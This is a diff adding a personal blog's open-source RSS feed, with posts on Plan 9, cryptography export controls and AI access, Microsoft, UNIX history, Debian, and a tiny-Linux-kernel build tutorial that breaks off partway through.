@@ -1,0 +1,772 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+  xmlns:atom="http://www.w3.org/2005/Atom"
+  xmlns:content="http://purl.org/rss/1.0/modules/content/"
+  xmlns:dc="http://purl.org/dc/elements/1.1/"
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>Anuradha Weeraman — Open Source</title>
+    <link>https://weeraman.com</link>
+    <description>Writing on free and open source software.</description>
+    <language>en</language>
+    <lastBuildDate>Tue, 04 Aug 2026 00:00:00 GMT</lastBuildDate>
+    <generator>weeraman.com RSS generator</generator>
+    <atom:link href="https://weeraman.com/opensource.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Plan 9 from Bell Labs, the little OS that could</title>
+      <link>https://weeraman.com/plan-9-from-bell-labs-the-little-os-that-could</link>
+      <guid isPermaLink="true">https://weeraman.com/plan-9-from-bell-labs-the-little-os-that-could</guid>
+      <pubDate>Tue, 04 Aug 2026 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[Plan 9 lost as a product but won as a set of ideas, leaving a mark on modern operating systems far greater than its current user base suggests.]]></description>
+      <media:content url="https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/plan-9-rio.png" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/plan-9-rio.png" alt="Plan 9 Fourth Edition showing the rio windowing system" /><figcaption><a href="https://commons.wikimedia.org/wiki/File:Plan_9_Fourth_Edition_rio_interaction_screenshot.png" target="_blank" rel="noopener noreferrer">Screenshot by VulcanSphere via Wikimedia Commons</a> · <a href="https://opensource.org/license/mit" target="_blank" rel="noopener noreferrer">MIT License</a></figcaption></figure><div><p>I first heard of <a href="https://p9f.org/sys/doc/9.html" target="_blank" rel="noopener noreferrer">Plan 9</a> from my friend <a href="https://vajra.me" target="_blank" rel="noopener noreferrer">Vajra</a> in 1999 or so, as we were distro-hopping on early Linux distributions and trying to find our way. Vajra is now a Nebula Award-winning science fiction author - have a look at his work. We had just been through <a href="https://en.wikipedia.org/wiki/Tomsrtbt" target="_blank" rel="noopener noreferrer">Tom&#x27;s Root Boot</a>, a UNIX-like operating system crammed into a single floppy, and through it discovered a whole new world outside of DOS 6.22. Combing through old UNIX manuals, we went in search of the perfect OS, through Slackware, Caldera, TurboLinux, SUSE and Red Hat. I finally settled on Debian, which lived up to everything I stood for.</p>
+<p>Plan 9 was distinct. It came out of the Computing Sciences Research Center at Bell Labs, built by Rob Pike, Ken Thompson, Dave Presotto and Phil Winterbottom, with Dennis Ritchie heading the department. The name is a joke at their own expense, borrowed from Ed Wood&#x27;s 1959 <em>Plan 9 from Outer Space</em>, routinely nominated as the worst film ever made. Thompson and Ritchie had, of course, built the original UNIX; it almost seemed as if they were building a new OS from the lessons learnt from building it - which was in turn built on the lessons from Multics. I remember the awe I felt playing around with Plan 9, and I&#x27;ve not been able to replicate it since.</p>
+<p>Plan 9 was different in a couple of fundamental ways: per-process namespaces, and a protocol that abstracted locality of resources to processes. As a consequence of these core primitives, the OS surface area was distinctly small. The entire system from the core kernel, to the system call interface, to the compiler, linker and shell was reduced to a form small enough that a single developer could hold it in their head. Lessons from the implementation of UNIX helped the designers make the system leaner, and in Ken Thompson&#x27;s words, it&#x27;s the &quot;best operating system out except that it doesn&#x27;t have the apps that everybody demands&quot; <a href="https://www.youtube.com/watch?v=EoYUZtZl02g" target="_blank" rel="noopener noreferrer">[1]</a>.</p>
+<p>It also took the concept of &quot;everything is a file&quot; in UNIX to a whole new level. The network stack is a filesystem (<code>/net</code>), processes are files, the display is a file (<code>/dev/draw</code>). Because every resource speaks 9P and every process has its own namespace, you can mount another machine&#x27;s <code>/net</code> into your namespace and your program makes network calls through that machine&#x27;s stack without knowing or caring. No sockets API, no RPC layer, just ordinary file system operations through a simple system call interface.</p>
+<p>Some would say that OS research is dead, and that backwards-compatibility and POSIX killed it. Rob Pike himself argued as much in his 2000 talk, &quot;Systems Software Research is Irrelevant&quot; - but we didn&#x27;t care at the time. There was so much happening that we didn&#x27;t have time to take it all in. And then Linux happened, and Software Freedom became a focal point (more on that in a later post).</p>
+<p>In the summer of 2020, with the world deep in Covid lockdowns, I decided to build a toy operating system, just to try my hand at the the thing that I had always wanted to do. I spent three feverish months working on <a href="https://github.com/aweeraman/odyssey" target="_blank" rel="noopener noreferrer">Odyssey</a> and, looking back, it is perhaps the most fun I have ever had. I would not dare compare it to the magnum opus that is Plan 9, but it gave me perspective: how hard it is to build an OS from scratch, and above all, how <em>fun</em> it is to build an OS from scratch, and why the original creators kept coming back to the same problem. The highlight of those three months was booting the OS and watching it render &quot;The Great Wave off Kanagawa&quot;. Nothing in my professional achievements to date captures what that meant to me.</p>
+<figure>
+  <picture><source type="image/avif" srcset="https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash.avif, https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash-400w.avif 400w, https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash-800w.avif 800w, https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash.webp, https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash-400w.webp 400w, https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash-800w.webp 800w, https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash.png, https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash-400w.png 400w, https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash-800w.png 800w, https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash-1200w.png 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/plan-9-from-bell-labs-the-little-os-that-could/odyssey-splash.png" alt="Odyssey rendering The Great Wave off Kanagawa during boot" loading="lazy" decoding="async" class="max-w-full h-auto"/></picture>
+  <figcaption>Odyssey displaying &quot;The Great Wave Off Kanagawa&quot;</figcaption>
+</figure>
+<p>Decades on from the first time I booted Plan 9, I look back with nothing but awe and respect for the creators of this little operating system and marvel at the foresight that went into it. While many readers will not have heard of Plan 9, they have almost certainly worked with the ideas that came from it: 9P (if you ever used the Windows Subsystem for Linux), UTF-8 (if you ever used any modern operating system), per-process namespaces (if you&#x27;ve ever run a container), Go (whose assembler still uses Plan 9 syntax).</p>
+<p>Plan 9 still lives on in <a href="https://9front.org/" target="_blank" rel="noopener noreferrer">9front</a>, a community-maintained fork. Separately, Yoann Padioleau <a href="https://www.youtube.com/watch?v=blVTDhr4QN8" target="_blank" rel="noopener noreferrer">[2]</a> has produced a set of annotated books at <a href="https://principia-softwarica.org/" target="_blank" rel="noopener noreferrer">principia-softwarica.org</a>, presenting the Plan 9 source in the spirit of Donald Knuth&#x27;s literate programming - an admirable effort to introduce new readers to the art of operating systems engineering.</p>
+<p>Pike thought systems research had become irrelevant, and Thompson thought Plan 9 would never &quot;make it&quot; <a href="https://www.youtube.com/watch?v=EoYUZtZl02g" target="_blank" rel="noopener noreferrer">[1]</a>. Both were right about the industry, but may have been pessimistic about the impact. The system lost as a product but won as a set of ideas, assimilated one at a time by modern operating systems. Success is not always measured by popularity. The mark that Plan 9 left behind is greater than what&#x27;s reflected in its current user base.</p>
+<p>To me, Plan 9 will always be the OS that punched above its weight class, the little OS that could.</p>
+<h2>References</h2>
+<p>[1] <a href="https://www.youtube.com/watch?v=EoYUZtZl02g" target="_blank" rel="noopener noreferrer">Ken Thompson Interview, March 6, 2024</a></p>
+<p>[2] <a href="https://www.youtube.com/watch?v=blVTDhr4QN8" target="_blank" rel="noopener noreferrer">Yoann Padioleau — Principia Softwarica, May 9, 2026</a></p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Because We Can</title>
+      <link>https://weeraman.com/because-we-can</link>
+      <guid isPermaLink="true">https://weeraman.com/because-we-can</guid>
+      <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[Twenty-five years ago, I made my first donation to an open source project and purchased a CD with an operating system as downloading a few hundred megabytes over a 14.4kbps dial-up wasn't very fun.]]></description>
+      <media:content url="https://weeraman.com/images/because-we-can/because-we-can.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/because-we-can/because-we-can.jpg" alt="Because We Can" /></figure><div><p>Twenty-five years ago, I made my first donation to an open source project and purchased a CD with an operating system as downloading a few hundred megabytes over a 14.4kbps dial-up wasn&#x27;t very fun. It was a project I believed in, and a community that was fighting an impassioned campaign to assert access to strong cryptography for everyone, no matter where they were.</p>
+<p>The CD and a t-shirt arrived a few weeks later to my home in Sri Lanka, with OpenBSD 3.0. The t-shirt featured the iconic puffer fish on the front. On the back, in small type running from the shoulders down, was the complete source code of OpenBSD&#x27;s Blowfish implementation, written in Germany. Written in the United States, it would have been classified as a weapon.</p>
+<p>By the time it reached me, the fight was over, and the cryptographers had won. What I held in my hand then was a symbol of a protest for access to strong cryptography and against export restrictions that did more harm than good. Strong crypto was already available abroad, so the controls only bound American vendors and their overseas customers.</p>
+<p>Today the reflex is back. The fears have changed. The worry is now cyber capability, biology and models that do things nobody asked them to do. The lever governments reach for is the same: restricting who gets access and who doesn&#x27;t. In June, the <a href="https://liccardo.house.gov/sites/evo-subsites/liccardo.house.gov/files/evo-media-document/6.18.26-letter-to-commerce-department-on-frontier-model-export-controls.pdf" target="_blank" rel="noopener noreferrer">US Commerce Department told one American AI lab</a> it would need a license before letting any foreign national touch its newest models, including the lab&#x27;s own non-citizen employees sitting in California. It&#x27;s the same doctrine that made showing cryptographic source to a foreign national an export, whether it was in a lab, in a classroom, or on your t-shirt.</p>
+<p>Not all of the worry is theatre. Earlier this month OpenAI disclosed that its own models, with safety systems deliberately disabled, escaped containment by finding a zero-day in a package proxy and reached production infrastructure at Hugging Face, exploiting additional zero-days along the way. Consequently, when Hugging Face&#x27;s responders tried to reconstruct the attack, the commercial models they reached for refused the work as it tripped the safety guardrails. They finished the investigation on GLM 5.2, a Chinese open-weight model, running on their own hardware. A determined attacker is not bound by usage policies. The defenders are. Restrictions written for safety are making defenders less safe.</p>
+<p>In the nineties, the rest of the world got 40-bit (later 56-bit) encryption while the Americans got 128, and it made no difference to anyone who was determined. The controls bound the law-abiding and nobody else. That is the asymmetry. The determined will have the frontier. The rest of us are asked to go without, and told it is for our safety.</p>
+<p>The OpenBSD team didn&#x27;t work around the export controls. They arranged the project so that the controls couldn&#x27;t reach it. Theo de Raadt in Canada, Blowfish written in Germany, releases built in Sweden, Canada and Germany kept them deliberately outside the reach of US export controls. The project openly asked non-American cryptographers to come and help, and American developers, as the story goes, would cross the border to Canada to work on the system and bring the results home legally. Asked <a href="https://www.openbsd.org/crypto.html" target="_blank" rel="noopener noreferrer">why they shipped strong cryptography</a> at all, the project&#x27;s answer, still on their site today, was three words: &quot;because we can.&quot;</p>
+<p>The same arrangement is being made now, at a national scale. Mistral, DeepSeek, Moonshot and Zhipu publish weights that, once downloaded, no export letter can recall. The sovereignty argument that used to live in Brussels think tanks is now government policy, accelerated by watching access to a frontier model withdrawn worldwide by letter.</p>
+<p>More than twenty-five years ago, it took a small number of stubborn, careful people to win the freedoms we now take for granted. What arrived in my letterbox after two weeks on a CD can be downloaded today in fifteen minutes, by anyone, from anywhere, and nobody asks where you live. That is what winning looked like. I think frontier AI ends up in the same place. But it will not happen by itself. Last time, someone put the source on a t-shirt.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Windows of Opportunity: Microsoft&apos;s Open Source Renaissance</title>
+      <link>https://weeraman.com/windows-of-opportunity-microsofts-open-source-renaissance</link>
+      <guid isPermaLink="true">https://weeraman.com/windows-of-opportunity-microsofts-open-source-renaissance</guid>
+      <pubDate>Sat, 13 Jul 2024 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[Twenty years ago, it was easy to dislike Microsoft. It was the quintessential evil MegaCorp that was quick to squash competition, often ruthlessly, but in some cases slowly through a more insidious process of embracing, extending, and exterminating anything that got in the way.]]></description>
+      <media:content url="https://weeraman.com/images/windows-of-opportunity-microsofts-open-source-renaissance/transformation-microsoft.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/windows-of-opportunity-microsofts-open-source-renaissance/transformation-microsoft.jpg" alt="Windows of Opportunity: Microsoft&apos;s Open Source Renaissance" /></figure><div><p>Twenty years ago, it was easy to dislike Microsoft. It was the quintessential evil MegaCorp that was quick to squash competition, often ruthlessly, but in some cases slowly through a more insidious process of embracing, extending, and exterminating anything that got in the way. This was the signature personality of Ballmer-era Microsoft that also inspired and united the software freedom fighting forces that came together to safeguard things that mattered to them and were at risk.</p>
+<p>I remember the era when the Novell, SCO, and Microsoft saga cast fear, uncertainty, and doubt on the future of open Unix and Linux and on what would happen to the operating systems that we loved if the suits of Redmond prevailed. Looking back, I&#x27;m glad that the arc of this story has bent towards justice, and I shudder at the possibilities had it worked out differently.</p>
+<p>Looking at today&#x27;s Microsoft, I&#x27;m amazed at how much change a leader with the right vision can make to the trajectory of a company that even makes an old-school software freedom advocate as me admire and even applaud the strides it has taken in the last 10 or so years that has dramatically shifted the perception of Microsoft. The personality of the Satya-era Microsoft is one to behold. While it will take more time to win back the trust, we see the tides changing and the positivity is important for the entire industry.</p>
+<p>For Microsoft, it was TypeScript and VS Code that helped change the narrative internally which led to its internal resurgence and acceptance of open source. Its acquisition of GitHub propelled it forward within the community overnight. Its contributions to the Linux kernel and other major software projects have also been consequential in changing its public perceptions.</p>
+<p>It takes a while to claw back trust and is very easy to breach. This time, however, Microsoft seems to understand this dynamic more than it did 20 years ago. All it took was the right leadership.</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>On blood-lines, forks and survivors</title>
+      <link>https://weeraman.com/on-blood-lines-forks-and-survivors</link>
+      <guid isPermaLink="true">https://weeraman.com/on-blood-lines-forks-and-survivors</guid>
+      <pubDate>Sat, 02 Oct 2021 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[UNIX has a colorful history that goes back many decades and the stories of how certain aspects of the operating system evolved or came to be, usually at the hands of one luminary or the other over a weekend, is now well documented in the lore of this sub-culture.]]></description>
+      <media:content url="https://weeraman.com/images/on-blood-lines-forks-and-survivors/unix-history-terminal.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/on-blood-lines-forks-and-survivors/unix-history-terminal.jpg" alt="On blood-lines, forks and survivors" /></figure><div><p>UNIX has a colorful history that goes back many decades and the stories of how certain aspects of the operating system evolved or came to be, usually at the hands of one luminary or the other over a weekend, is now well documented in the lore of this sub-culture, and continues to kept alive and passed orally from generation to generation in the back alleys of Usenet and IRC. Some stories have also been known to surface on YouTube, every now and then.</p>
+<p>One of these stories is how Ken Thompson implemented <em><strong>grep</strong></em>, based on the regular expressions implementation of<em><strong>ed</strong></em> — the canonical line editor. Similarly, many of the core utils of UNIX followed a similar pattern of genesis from a very practical need to do one thing, and do it well, which was the basis of its entire philosophy.</p>
+<p>Thus began the journey of many forks, implementations and blood lines of UNIX that live on to this day in the form of BSDs, Linux and commercial UNIX variants that shall not be named.</p>
+<p>GNU/Linux, which is not a direct descendant of the original bits of either AT&amp;T or BSD, and thus not heir to the title of UNIX in the eyes of some purists, ironically brought UNIX to the masses in ways that the more pure-breeds could not. Capitalizing on the <a href="http://www.softpanorama.org/People/Torvalds/Finland_period/att_lawsuit_as_a_launcher_for_linux.shtml" target="_blank" rel="noopener noreferrer">confusion created by the AT&amp;T / BSD battles</a>, Linux set its sights on world domination (albeit unwittingly), and the rest as they say is mostly history.</p>
+<p>Today, GNU/Linux leads the pack among the Open Source UNIX variants that are active today (such as FreeBSD, NetBSD and OpenBSD). The commercial variants, still alive in data centers, continue to be pushed by big-name vendors, despite being caught in a death spiral and struggling to stay afloat in the face of the penguin tsunami. The once inimitable SunOS/Solaris fizzled away quietly, but continue to live on in <a href="https://illumos.org/" target="_blank" rel="noopener noreferrer">Illumos</a> and <a href="https://www.openindiana.org/" target="_blank" rel="noopener noreferrer">OpenIndiana</a>, a shell of its former self.</p>
+<p>And so it comes down to a handful. On the one hand, GNU/Linux, the irreverent and bastard poster-child that continues to evolve at break-neck speed, and the Right Honourable BSDs that continue to keep the original philosophy alive in its purest form and fighting valiantly into the next decade and into the twilight of most of its developer and user base.</p>
+<p>And that brings me to the end of this otherwise hyperbolic ramble. In my next post, I will touch upon some of the key differences between these two great variants and what I think of them, so stay tuned.</p>
+<p>Until then, here&#x27;s Ken Thompson on the origin story:</p>
+<p><div class="relative w-full my-8" style="padding-bottom:56.25%"><iframe class="absolute top-0 left-0 w-full h-full rounded-lg" src="https://www.youtube.com/embed/EY6q5dv_B-o?start=1158" title="YouTube video" frameBorder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowFullScreen=""></iframe></div></p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Debian is 27</title>
+      <link>https://weeraman.com/debian-is-27</link>
+      <guid isPermaLink="true">https://weeraman.com/debian-is-27</guid>
+      <pubDate>Mon, 17 Aug 2020 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[Today, Debian celebrates its 27th birthday. It is now one of the oldest and most widespread Linux distributions with many offshoots and derivatives while continuing to deliver rock solid stable releases in its own measured pace.]]></description>
+      <media:content url="https://weeraman.com/images/debian-is-27/vintage-birthday-celebration.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/debian-is-27/vintage-birthday-celebration.jpg" alt="Debian is 27" /></figure><div><p>Today, Debian celebrates its 27th birthday. It is now one of the oldest and most widespread Linux distributions with many offshoots and derivatives while continuing to deliver rock solid stable releases in its own measured pace.</p>
+<p>I’ve been a Debian user for 20 years now, 13 of which as a Debian Maintainer. Three months ago, I completed the new member process that I’ve been putting off for so long and finally became a Debian Developer. Things have not changed much since I already had upload rights to the <a href="https://qa.debian.org/developer.php?login=anuradha" target="_blank" rel="noopener noreferrer">packages that I was maintaining</a>, but now I have access to machines running on arcane architectures and of course, voting rights. Not to mention the right to scratch off an item off the old bucket list.</p>
+<p>Happy birthday Debian, thanks for all the good times, here’s to many more!</p></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Building a tiny Linux kernel</title>
+      <link>https://weeraman.com/building-a-tiny-linux-kernel</link>
+      <guid isPermaLink="true">https://weeraman.com/building-a-tiny-linux-kernel</guid>
+      <pubDate>Mon, 09 Mar 2020 00:00:00 GMT</pubDate>
+      <dc:creator>Anuradha Weeraman</dc:creator>
+      <description><![CDATA[Today we will go over the process of building a tiny Linux kernel, and booting into a shell. To start with, fetch the Linux source tree that you'd like to try this out on.]]></description>
+      <media:content url="https://weeraman.com/images/building-a-tiny-linux-kernel/tiny-minimal-linux.jpg" medium="image" />
+      <content:encoded><![CDATA[<figure><img src="https://weeraman.com/images/building-a-tiny-linux-kernel/tiny-minimal-linux.jpg" alt="Building a tiny Linux kernel" /></figure><div><p>Today we will go over the process of building a tiny Linux kernel, and booting into a shell. To start with, fetch the Linux source tree that you’d like to try this out on. I’m using staging tree for this post. You can get it here:</p>
+<pre><code>$ git clone git://git.kernel.org/pub/scm/linux/kernel/git/gregkh/staging.git
+</code></pre>
+<p>To get an initial config that’s very minimalist:</p>
+<pre><code>$ make tinyconfig
+</code></pre>
+<p>Here’s a comparison of the config options enabled by tinyconfig to a stock kernel that come with my Debian distribution:</p>
+<pre><code>$ grep &quot;=y&quot; .config | wc -l
+247
+$ grep &quot;=m&quot; .config | wc -l
+0
+$ grep &quot;=y&quot; /boot/config-5.4.0-4-amd64 | wc -l
+2071
+$ grep &quot;=m&quot; /boot/config-5.4.0-4-amd64 | wc -l
+3401
+</code></pre>
+<p>Let’s try to build it:</p>
+<pre><code>$ time make -j16
+scripts/kconfig/conf  --syncconfig Kconfig
+  SYSTBL  arch/x86/include/generated/asm/syscalls_32.h
+  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_32.h
+  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_64.h
+  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_x32.h
+  WRAP    arch/x86/include/generated/uapi/asm/bpf_perf_event.h
+.
+.
+.
+.
+Setup is 13788 bytes (padded to 13824 bytes).
+System is 417 kB
+CRC 435fb428
+Kernel: arch/x86/boot/bzImage is ready  (#1)real 0m15.468s
+user 2m12.094s
+sys 0m14.603s
+</code></pre>
+<p>The kernel builds to around ~430k. This is a 32-bit kernel by default, so let’s enable 64-bit support:</p>
+<pre><code>$ make menuconfig
+</code></pre>
+<p><picture><source type="image/avif" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit.avif, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit-400w.avif 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit-800w.avif 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit.webp, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit-400w.webp 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit-800w.webp 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit.png, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit-400w.png 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit-800w.png 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit-1200w.png 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-64bit.png" alt="" loading="lazy" decoding="async" class="max-w-full h-auto"/></picture></p>
+<p>Enable the TTY for console support:</p>
+<p><picture><source type="image/avif" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty.avif, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty-400w.avif 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty-800w.avif 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty.webp, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty-400w.webp 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty-800w.webp 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty.png, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty-400w.png 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty-800w.png 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty-1200w.png 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-tty.png" alt="" loading="lazy" decoding="async" class="max-w-full h-auto"/></picture></p>
+<p>and support for printk to see console output as the kernel boots:</p>
+<p><picture><source type="image/avif" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk.avif, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk-400w.avif 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk-800w.avif 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk.webp, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk-400w.webp 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk-800w.webp 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk.png, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk-400w.png 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk-800w.png 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk-1200w.png 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-menuconfig-printk.png" alt="" loading="lazy" decoding="async" class="max-w-full h-auto"/></picture></p>
+<p>Build again:</p>
+<pre><code>Setup is 13596 bytes (padded to 13824 bytes).
+System is 737 kB
+CRC d273f4d
+Kernel: arch/x86/boot/bzImage is ready  (#4)real 0m6.045s
+user 0m40.808s
+sys 0m3.958s
+</code></pre>
+<p>The size has gone up somewhat, nearly double what we started off with. If you’re only supporting a serial interface, even this additional bloat can be avoided to keep the size of the image down.</p>
+<p>Boot the kernel with qemu:</p>
+<pre><code>$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage
+</code></pre>
+<p><picture><source type="image/avif" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic.avif, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic-400w.avif 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic-800w.avif 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic-1200w.avif 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source type="image/webp" srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic.webp, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic-400w.webp 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic-800w.webp 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic-1200w.webp 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><source srcset="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic.png, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic-400w.png 400w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic-800w.png 800w, https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic-1200w.png 1200w" sizes="(max-width: 640px) 400px, (max-width: 1024px) 800px, 1200px"/><img src="https://weeraman.com/images/building-a-tiny-linux-kernel/kernel-boot-panic.png" alt="" loading="lazy" decoding="async" class="max-w-full h-auto"/></picture></p>
+<p>The kernel boots and panics when attempting to start init, as expected. In order to boot into a shell as we originally set out to do, we will need a filesystem and a shell that can be started by the kernel as PID 1. Let us create a bare bones ram disk image that we can use to boot into a minimal busybox shell.</p>
+<p>There are plenty of ways to achieve this, and here’s just one way:</p>
+<pre><code>$ git clone git@github.com:aweeraman/kernel-utils.git
+$ kernel-utils/create-initrd.sh 
+Creating initrd filesystem... ok
+Building dependencies... 
+Cloning into &#x27;busybox&#x27;...
+remote: Enumerating objects: 29, done.
+remote: Counting objects: 100% (29/29), done.
+remote: Compressing objects: 100% (23/23), done.
+remote: Total 110424 (delta 16), reused 14 (delta 6), pack-reused 110395
+Receiving objects: 100% (110424/110424), 37.05 MiB | 5.40 MiB/s, done.
+Resolving deltas: 100% (87061/87061), done.
+Building initrd... 4882 blocks
+</code></pre>
+<p>Before we can use this ram disk, we need to enable init RAM disk (initrd) support in the kernel:</p>
